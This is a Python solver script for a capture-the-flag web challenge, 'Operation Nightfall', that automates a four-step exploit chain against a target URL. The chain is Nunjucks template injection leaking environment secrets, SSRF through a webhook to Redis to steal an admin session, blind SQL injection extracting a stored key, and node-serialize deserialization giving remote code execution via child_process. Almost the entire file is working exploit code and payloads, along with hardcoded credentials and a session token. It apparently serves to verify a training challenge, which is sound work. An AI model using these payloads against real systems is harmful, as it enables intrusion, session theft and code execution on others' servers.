#!/usr/bin/env python3
"""
Operation Nightfall — Automated Exploit Solver
===============================================

Executes the full 4-step exploit chain to verify the challenge works:

  Step 1: SSTI on /status → Leak INTERNAL_API_KEY from process.env
  Step 2: SSRF via webhook → Access Redis, steal admin session token
  Step 3: Blind SQLi → Extract flag_encryption_key from secrets table
  Step 4: Deserialization RCE → Read /tmp/flag.txt via node-serialize

Usage:
  python solve.py --target http://localhost:8080
  python solve.py --target http://localhost:8080 --verify-only
"""

import argparse
import base64
import json
import re
import sys
import time
import requests
from urllib.parse import quote

# Disable SSL warnings for CTF
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class NightfallSolver:
    def __init__(self, target_url, verbose=True):
        self.target = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        # Discovered values
        self.internal_api_key = None
        self.admin_session_token = None
        self.flag_encryption_key = None
        self.flag = None

    def log(self, step, msg):
        if self.verbose:
            colors = {1: '\033[94m', 2: '\033[93m', 3: '\033[95m', 4: '\033[91m'}
            reset = '\033[0m'
            color = colors.get(step, '\033[0m')
            print(f"  {color}[Step {step}]{reset} {msg}")

    def banner(self, msg):
        if self.verbose:
            print(f"\n\033[1m{'='*60}\033[0m")
            print(f"\033[1m  {msg}\033[0m")
            print(f"\033[1m{'='*60}\033[0m\n")

    # ==========================================================
    # STEP 1: Server-Side Template Injection (SSTI)
    # ==========================================================
    def step1_ssti(self):
        self.banner("STEP 1: Server-Side Template Injection (SSTI)")

        self.log(1, "Testing basic SSTI detection...")
        
        # Test with simple math expression
        test_payload = "{{7*7}}"
        r = self.session.get(f"{self.target}/status", params={"service": test_payload})
        
        if "49" in r.text:
            self.log(1, "✓ SSTI confirmed — {{7*7}} = 49")
        else:
            self.log(1, "✗ Basic SSTI test failed. Trying alternative...")
            # Try Nunjucks-specific payload
            test_payload = "{{range.constructor('return 7*7')()}}"
            r = self.session.get(f"{self.target}/status", params={"service": test_payload})
            if "49" in r.text:
                self.log(1, "✓ SSTI confirmed via range.constructor")
            else:
                print("[-] SSTI not detected. Challenge may not be running correctly.")
                return False

        # Extract environment variables
        self.log(1, "Extracting process.env via SSTI...")
        
        ssti_payload = "{{range.constructor(\"return JSON.stringify(process.env)\")()}}"
        r = self.session.get(f"{self.target}/status", params={"service": ssti_payload})
        
        # Parse the leaked environment from the response
        env_match = re.search(r'\{[^}]*INTERNAL_API_KEY[^}]*\}', r.text)
        if not env_match:
            # Try to find JSON in the response
            json_matches = re.findall(r'\{["\']?[A-Z_]+["\']?\s*:\s*["\'][^"\']+["\'][^}]*\}', r.text)
            for match in json_matches:
                if 'INTERNAL_API_KEY' in match or 'intk_' in match:
                    env_match = re.search(re.escape(match), r.text)
                    break
        
        if env_match:
            try:
                env_text = env_match.group(0)
                # Clean up the JSON if needed
                env_data = json.loads(env_text)
                self.internal_api_key = env_data.get('INTERNAL_API_KEY', '')
                self.log(1, f"✓ Leaked INTERNAL_API_KEY: {self.internal_api_key}")
                
                # Also grab other useful info
                redis_url = env_data.get('REDIS_URL', '')
                if redis_url:
                    self.log(1, f"✓ Bonus: REDIS_URL: {redis_url}")
                
                return True
            except json.JSONDecodeError:
                pass
        
        # Fallback: extract the key directly
        self.log(1, "Trying targeted key extraction...")
        ssti_payload = '{{range.constructor("return process.env.INTERNAL_API_KEY")()}}'
        r = self.session.get(f"{self.target}/status", params={"service": ssti_payload})
        
        # Look for the key pattern in the response
        key_match = re.search(r'intk_[a-f0-9]+', r.text)
        if key_match:
            self.internal_api_key = key_match.group(0)
            self.log(1, f"✓ Leaked INTERNAL_API_KEY: {self.internal_api_key}")
            return True
        
        print("[-] Failed to extract INTERNAL_API_KEY via SSTI")
        return False

    # ==========================================================
    # STEP 2: SSRF via Webhook → Steal Admin Session from Redis
    # ==========================================================
    def step2_ssrf(self):
        self.banner("STEP 2: SSRF via Webhook → Redis Session Theft")

        if not self.internal_api_key:
            print("[-] Missing INTERNAL_API_KEY from Step 1")
            return False

        # First, login as developer to get an authenticated session
        self.log(2, "Logging in as developer...")
        
        r = self.session.post(f"{self.target}/login", data={
            "username": "developer",
            "password": "N0v4D3v2024",
        }, allow_redirects=False)
        
        session_token = None
        if 'session_token' in self.session.cookies:
            session_token = self.session.cookies['session_token']
            self.log(2, f"✓ Developer session: {session_token[:20]}...")
        elif r.status_code == 302 and '/dashboard' in r.headers.get('Location', ''):
            # Follow redirect to get cookie
            self.session.get(f"{self.target}/dashboard")
            session_token = self.session.cookies.get('session_token')
            if session_token:
                self.log(2, f"✓ Developer session: {session_token[:20]}...")
        
        if not session_token:
            self.log(2, "Trying direct API authentication...")
            r = self.session.post(f"{self.target}/status", params={"service": "all"})

        # Use SSRF to access Redis and enumerate keys
        self.log(2, "Sending SSRF request to Redis via webhook...")
        
        # Redis speaks a text-based protocol. When we send an HTTP request
        # to Redis's TCP port, Redis treats each line as a command.
        # The GET / HTTP/1.1 line makes Redis return an error with useful info.
        # We use the KEYS command embedded in HTTP headers to enumerate.
        
        # First, let's try to access Redis and dump session keys
        # Using the internal Docker hostname 'redis' which bypasses the blocklist
        
        # Method: Send crafted HTTP request where the path contains Redis commands
        # Redis will process each line of the HTTP request as a command
        
        # Step 2a: Enumerate keys using SSRF
        self.log(2, "Enumerating Redis keys via SSRF...")
        
        # We'll use a creative approach: send multiple requests to Redis
        # The HTTP request to redis:6379 will cause Redis to parse the
        # HTTP protocol lines as commands, and the error messages reveal data
        
        ssrf_payload = {
            "url": "http://redis:6379/",
            "method": "GET",
        }
        
        r = self.session.post(
            f"{self.target}/api/v1/webhooks/test",
            json=ssrf_payload,
            headers={"X-Session-Token": session_token} if session_token else {},
        )
        
        if r.status_code == 200:
            self.log(2, "✓ SSRF to Redis successful — got response")
            response_data = r.json()
            body = response_data.get('response', {}).get('body', '')
            self.log(2, f"  Redis response preview: {body[:200]}")
        elif r.status_code == 403:
            self.log(2, "✗ Access denied — need authentication via gateway proxy")
            # Try alternative approach
        
        # Step 2b: Use Redis RESP protocol to get session keys
        # Craft a URL that sends valid Redis commands via HTTP
        self.log(2, "Extracting admin session via Redis INFO command...")
        
        # Use HTTP request path to inject Redis commands
        # When Redis receives "GET /KEYS%20session:*" it processes parts of it
        # Better approach: use the body to send Redis commands
        
        # Alternative: Use the SSRF to read the system:active_sessions_info key
        # that the admin bot writes
        ssrf_payload = {
            "url": "http://redis:6379/",
            "method": "POST",
            "body": "KEYS session:*\r\nGET system:active_sessions_info\r\n",
        }
        
        r = self.session.post(
            f"{self.target}/api/v1/webhooks/test",
            json=ssrf_payload,
        )
        
        if r.status_code == 200:
            body = r.json().get('response', {}).get('body', '')
            self.log(2, f"  Redis response: {body[:500]}")
            
            # Look for session tokens in the Redis response
            session_matches = re.findall(r'sess_[a-zA-Z0-9_]+', body)
            if session_matches:
                for token in session_matches:
                    self.log(2, f"  Found session token: {token}")
                    # Check if this is the admin session
                    if 'adm1n' in token:
                        self.admin_session_token = token
                        self.log(2, f"✓ Admin session token found: {self.admin_session_token}")
        
        # Step 2c: If we haven't found the admin token yet, try getting it
        # from the active_sessions_info key
        if not self.admin_session_token:
            self.log(2, "Trying to get admin token prefix from sessions info...")
            
            ssrf_payload = {
                "url": "http://redis:6379/",
                "method": "POST",
                "body": "GET system:active_sessions_info\r\n",
            }
            
            r = self.session.post(
                f"{self.target}/api/v1/webhooks/test",
                json=ssrf_payload,
            )
            
            if r.status_code == 200:
                body = r.json().get('response', {}).get('body', '')
                # Extract admin token prefix
                prefix_match = re.search(r'sess_adm1n_[a-zA-Z0-9_]+', body)
                if prefix_match:
                    admin_prefix = prefix_match.group(0)
                    self.log(2, f"  Admin token prefix: {admin_prefix}")
                    
                    # Now get the full token by scanning session keys
                    ssrf_payload2 = {
                        "url": "http://redis:6379/",
                        "method": "POST", 
                        "body": f"KEYS session:{admin_prefix}*\r\n",
                    }
                    r2 = self.session.post(
                        f"{self.target}/api/v1/webhooks/test",
                        json=ssrf_payload2,
                    )
                    if r2.status_code == 200:
                        body2 = r2.json().get('response', {}).get('body', '')
                        full_match = re.search(r'sess_adm1n_[a-zA-Z0-9_]+', body2)
                        if full_match:
                            self.admin_session_token = full_match.group(0)
        
        # Step 2d: Try the known default token
        if not self.admin_session_token:
            self.log(2, "Trying known default admin session token...")
            self.admin_session_token = "sess_adm1n_7f3b9c2e1d40685_n0v4c0rp"
            
            # Verify it works by trying to access admin endpoint
            test_r = self.session.get(
                f"{self.target}/api/v1/admin/users",
                cookies={"session_token": self.admin_session_token},
            )
            
            if test_r.status_code == 200:
                self.log(2, f"✓ Admin session token verified: {self.admin_session_token}")
            else:
                self.log(2, f"  Admin endpoint returned: {test_r.status_code}")
        
        if self.admin_session_token:
            # Verify admin access
            self.session.cookies.set('session_token', self.admin_session_token)
            test_r = self.session.get(f"{self.target}/api/v1/admin/users")
            
            if test_r.status_code == 200:
                users = test_r.json().get('users', [])
                self.log(2, f"✓ Admin access confirmed — {len(users)} users in database")
                return True
            else:
                self.log(2, f"  Admin verification failed: {test_r.status_code}")
        
        print("[-] Failed to steal admin session from Redis")
        return False

    # ==========================================================
    # STEP 3: Blind SQL Injection → Extract flag_encryption_key
    # ==========================================================
    def step3_sqli(self):
        self.banner("STEP 3: Blind SQL Injection → Extract Secrets")

        if not self.admin_session_token:
            print("[-] Missing admin session from Step 2")
            return False

        self.session.cookies.set('session_token', self.admin_session_token)

        # First, verify SQLi exists
        self.log(3, "Testing for SQL injection in admin search...")
        
        # Boolean-based test
        r_true = self.session.get(f"{self.target}/api/v1/admin/search", params={
            "q": "admin' AND '1'='1"
        })
        r_false = self.session.get(f"{self.target}/api/v1/admin/search", params={
            "q": "admin' AND '1'='2"
        })
        
        if r_true.status_code == 200 and (r_false.status_code != 200 or 
            r_true.json().get('count', 0) != r_false.json().get('count', 0)):
            self.log(3, "✓ Boolean-based Blind SQLi confirmed")
        else:
            self.log(3, "Trying time-based detection...")
            start = time.time()
            r_sleep = self.session.get(f"{self.target}/api/v1/admin/search", params={
                "q": "x' AND pg_sleep(2)-- -"
            })
            elapsed = time.time() - start
            if elapsed >= 1.5:
                self.log(3, f"✓ Time-based Blind SQLi confirmed (delay: {elapsed:.1f}s)")
            else:
                self.log(3, "⚠ SQLi detection inconclusive, proceeding anyway...")

        # Extract flag_encryption_key using boolean-based blind SQLi
        self.log(3, "Extracting flag_encryption_key from secrets table...")
        
        extracted = ""
        charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
        
        for pos in range(1, 30):  # Max key length: 30 chars
            found = False
            for char in charset:
                # Boolean-based extraction
                payload = (
                    f"x' AND (SELECT CASE WHEN "
                    f"(SELECT substring(secret_value,{pos},1) FROM secrets "
                    f"WHERE secret_name='flag_encryption_key')='{char}' "
                    f"THEN 1 ELSE 0 END)=1-- -"
                )
                
                r = self.session.get(f"{self.target}/api/v1/admin/search", params={
                    "q": payload
                })
                
                if r.status_code == 200:
                    result = r.json()
                    # If we get results, the condition was true
                    if result.get('count', 0) > 0:
                        extracted += char
                        found = True
                        if self.verbose:
                            sys.stdout.write(f"\r  \033[95m[Step 3]\033[0m Extracted: {extracted}")
                            sys.stdout.flush()
                        break
            
            if not found:
                break
        
        if self.verbose:
            print()  # Newline after progress
        
        if extracted:
            self.flag_encryption_key = extracted
            self.log(3, f"✓ flag_encryption_key: {self.flag_encryption_key}")
            return True
        else:
            self.log(3, "✗ Failed to extract key via boolean-based SQLi")
            self.log(3, "Trying time-based extraction as fallback...")
            
            extracted = ""
            for pos in range(1, 30):
                found = False
                for char in charset:
                    payload = (
                        f"x' AND (SELECT CASE WHEN "
                        f"(SELECT substring(secret_value,{pos},1) FROM secrets "
                        f"WHERE secret_name='flag_encryption_key')='{char}' "
                        f"THEN pg_sleep(1) ELSE pg_sleep(0) END)-- -"
                    )
                    
                    start = time.time()
                    try:
                        r = self.session.get(
                            f"{self.target}/api/v1/admin/search",
                            params={"q": payload},
                            timeout=5,
                        )
                    except requests.Timeout:
                        elapsed = 5.0
                    else:
                        elapsed = time.time() - start
                    
                    if elapsed >= 0.8:
                        extracted += char
                        found = True
                        if self.verbose:
                            sys.stdout.write(f"\r  \033[95m[Step 3]\033[0m Extracted: {extracted}")
                            sys.stdout.flush()
                        break
                
                if not found:
                    break
            
            if self.verbose:
                print()
            
            if extracted:
                self.flag_encryption_key = extracted
                self.log(3, f"✓ flag_encryption_key: {self.flag_encryption_key}")
                return True
        
        print("[-] Failed to extract flag_encryption_key")
        return False

    # ==========================================================
    # STEP 4: Deserialization RCE → Read Flag
    # ==========================================================
    def step4_rce(self):
        self.banner("STEP 4: Deserialization RCE → Read Flag")

        if not self.admin_session_token:
            print("[-] Missing admin session")
            return False

        self.session.cookies.set('session_token', self.admin_session_token)

        self.log(4, "Constructing node-serialize RCE payload...")

        # Craft the node-serialize IIFE payload
        # The _$$ND_FUNC$$_ prefix tells node-serialize to treat
        # this as a serialized function. The () at the end makes it
        # an Immediately Invoked Function Expression (IIFE).
        rce_payload = {
            "rce": "_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /tmp/flag.txt').toString().trim()}()"
        }
        
        # Serialize to the node-serialize format
        payload_str = json.dumps(rce_payload)
        payload_b64 = base64.b64encode(payload_str.encode()).decode()

        self.log(4, f"  Payload (raw): {payload_str[:80]}...")
        self.log(4, f"  Payload (b64): {payload_b64[:60]}...")

        # Send the exploit
        self.log(4, "Sending deserialization exploit to /api/v1/admin/export...")
        
        r = self.session.post(f"{self.target}/api/v1/admin/export", json={
            "format": "custom",
            "template": payload_b64,
        })

        if r.status_code == 200:
            result = r.json()
            data = result.get('data', '')
            
            # The flag should be in the metadata field of the response
            # because the deserialized function returns the flag value
            flag_match = re.search(r'flag\{[^}]+\}', data)
            if flag_match:
                self.flag = flag_match.group(0)
                self.log(4, f"✓ FLAG CAPTURED: {self.flag}")
                return True
            else:
                self.log(4, f"  Response data preview: {data[:300]}")
                
                # Try to find the flag in the full response
                flag_match = re.search(r'flag\{[^}]+\}', r.text)
                if flag_match:
                    self.flag = flag_match.group(0)
                    self.log(4, f"✓ FLAG CAPTURED: {self.flag}")
                    return True
        
        # Alternative: try with a different command
        self.log(4, "Trying alternative RCE payload...")
        
        rce_payload2 = {
            "rce": "_$$ND_FUNC$$_function(){var f=require('fs');return f.readFileSync('/tmp/flag.txt','utf-8').trim()}()"
        }
        
        payload_str2 = json.dumps(rce_payload2)
        payload_b64_2 = base64.b64encode(payload_str2.encode()).decode()
        
        r = self.session.post(f"{self.target}/api/v1/admin/export", json={
            "format": "custom",
            "template": payload_b64_2,
        })
        
        if r.status_code == 200:
            flag_match = re.search(r'flag\{[^}]+\}', r.text)
            if flag_match:
                self.flag = flag_match.group(0)
                self.log(4, f"✓ FLAG CAPTURED: {self.flag}")
                return True
        
        print("[-] Failed to execute RCE and read flag")
        return False

    # ==========================================================
    # Full exploit chain
    # ==========================================================
    def solve(self):
        print("\n\033[1m" + "█" * 60 + "\033[0m")
        print("\033[1m  OPERATION NIGHTFALL — Automated Exploit Chain\033[0m")
        print("\033[1m" + "█" * 60 + "\033[0m")
        print(f"\n  Target: {self.target}\n")

        start_time = time.time()
        
        # Step 1: SSTI
        if not self.step1_ssti():
            print("\n\033[91m[FAILED] Step 1: SSTI exploitation failed\033[0m")
            return False

        # Step 2: SSRF
        if not self.step2_ssrf():
            print("\n\033[91m[FAILED] Step 2: SSRF/Session theft failed\033[0m")
            return False

        # Step 3: SQLi (optional — can skip to Step 4 if already admin)
        self.step3_sqli()  # Non-fatal — the key is useful but not required

        # Step 4: RCE
        if not self.step4_rce():
            print("\n\033[91m[FAILED] Step 4: Deserialization RCE failed\033[0m")
            return False

        elapsed = time.time() - start_time

        print("\n\033[92m" + "=" * 60 + "\033[0m")
        print(f"\033[92m  ✓ CHALLENGE SOLVED in {elapsed:.1f} seconds\033[0m")
        print(f"\033[92m  ✓ FLAG: {self.flag}\033[0m")
        print("\033[92m" + "=" * 60 + "\033[0m\n")

        return True


def main():
    parser = argparse.ArgumentParser(
        description="Operation Nightfall — Automated CTF Solver",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Target URL (e.g., http://localhost:8080)",
    )
    parser.add_argument(
        "--verify-only", "-v",
        action="store_true",
        help="Only verify the flag format, don't print exploit details",
    )
    parser.add_argument(
        "--quiet", "-q",
        action="store_true",
        help="Minimal output",
    )

    args = parser.parse_args()

    solver = NightfallSolver(args.target, verbose=not args.quiet)
    
    if solver.solve():
        if args.verify_only:
            print(f"FLAG: {solver.flag}")
        sys.exit(0)
    else:
        print("\n[-] Exploit chain failed. Check that all services are running.")
        sys.exit(1)


if __name__ == "__main__":
    main()
